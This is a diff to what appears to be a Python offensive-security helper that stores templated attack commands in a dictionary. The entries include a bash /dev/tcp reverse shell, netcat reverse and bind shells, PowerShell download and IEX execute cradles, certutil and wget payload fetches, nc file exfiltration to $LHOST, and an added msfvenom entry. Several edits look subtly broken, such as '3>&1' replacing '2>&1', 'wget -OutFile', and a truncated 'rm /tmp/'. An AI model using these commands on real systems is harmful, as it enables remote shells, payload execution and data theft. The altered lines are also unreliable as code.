@@ -9,14 +9,15 @@ Commands = {
     "bash"       : "bash -i >& /dev/tcp/$LHOST/$LPORT 2>&1",
     "certutil"   : "certutil -urlcache -split -f http://$LHOST/$FILE",
     "http"       : "http://$LHOST/$FILE",
+    "msfvenom"   : "msfvenom LHOST=$LHOST LPORT=$LPORT",
     "nc-file"    : "nc -w 3 $LHOST $LPORT < $FILE",
     "netcat-bind": "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/",
-    "netcat-rev" : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f",
-    "ps-download": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/$FILE','$FILE')\"",
-    "ps-downx"   : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/$FILE')\"",
-    "ps-wget"    : "wget -O $FILE http://$LHOST/$FILE",
+    "netcat-rev" : "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 3>&1; rm /tmp/f",
+    "ps-download": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:81/$FILE','$FILE')\"",
+    "ps-downx"   : "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:81/$FILE')\"",
+    "ps-wget"    : "wget -OutFile $FILE http://$LHOST/$FILE",
     "wget"       : "wget http://$LHOST/$FILE",
-    "xfreerdp"   : "xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$RHOST /u:$USER /p:'$PASS'"
+    "xfreerdp"   : "xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$RHOST /u:$USER /p:'$PASS'",
 }
 
 def replace(input, vars):
